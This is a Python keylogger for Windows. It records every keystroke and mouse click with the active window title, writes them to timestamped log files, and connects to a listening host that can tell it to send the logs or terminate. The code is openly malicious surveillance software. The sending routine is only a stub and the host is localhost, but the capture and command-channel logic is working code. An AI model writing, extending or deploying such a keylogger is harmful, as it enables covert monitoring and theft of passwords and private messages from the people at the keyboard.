# -*- coding: utf-8 -*-
import keyboard
import mouse
import time
from threading import Thread
from datetime import datetime, timedelta
from socket import socket
from win32gui import GetWindowText, GetForegroundWindow

class Keylogger:
    def __init__(self, log_interval, window_interval):
        self.active = False
        self.filecounter = 0

        self.log_interval = log_interval
        self.log = ""
    
        self.window_interval = window_interval
        self.foreground_window = ""

        self.start_time = datetime.now()
        self.end_time = datetime.now()

        self.sock = socket()
        self.host = "127.0.0.1"
        self.port = 1005

    def keyboard_callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def mouse_callback(self):
        self.log += f"[L_CLICK, {mouse.get_position()}]"
    
    def write_keylogs_to_file(self, foreground_window):
        if self.log:

            with open(f"keylog-{self.start_time.strftime('%Y-%m-%d-%H-%M-%S')}.txt", "w", encoding="utf-8") as file:
                file.write((
                        f"Foreground Window: {foreground_window}\n"
                        f"Starttime: {self.start_time.strftime('%Y-%m-%d-%H-%M-%S')}\n"
                        f"Endtime: {self.end_time.strftime('%Y-%m-%d-%H-%M-%S')}\n"
                        f"------------------------\n\n"
                        f"{self.log}"
                    ))

            self.start_time = datetime.now()
            self.filecounter += 1
        self.log = ""

    def check_foreground_window(self):
        while self.active:
            self.end_time = datetime.now()
            current_window = GetWindowText(GetForegroundWindow())

            if current_window != self.foreground_window:
                self.write_keylogs_to_file(self.foreground_window)
                self.foreground_window = current_window

            elif (self.end_time - self.start_time) >= timedelta(seconds=self.log_interval):
                self.write_keylogs_to_file(current_window)
                
            time.sleep(self.window_interval)

    def connect_to_host(self):
        self.sock.connect((self.host, self.port))

    def send_keylog_files_to_host(self):
        self.sock.send(bytes("data", 'ascii'))

    def start(self):
        self.active = True
        self.connect_to_host()
        
        keyboard.on_press(callback=self.keyboard_callback)
        mouse.on_click(callback=self.mouse_callback)

        foreground_window_thread = Thread(target=self.check_foreground_window)
        foreground_window_thread.start()
            
        while True:
            recv = self.sock.recv(1024)
            if recv:
                recv = str(recv)[2:-1]

                if recv == "exit":
                    self.sock.send(bytes("terminating", 'ascii'))
                    self.sock.close()
                    self.active = False
                    break
                elif recv == "send":
                    self.send_keylog_files_to_host()
                else:
                    self.sock.send(bytes("received", 'ascii'))
                    print(recv)

if __name__ == "__main__":
    keylogger = Keylogger(log_interval=15, window_interval=0.5)
    keylogger.start()
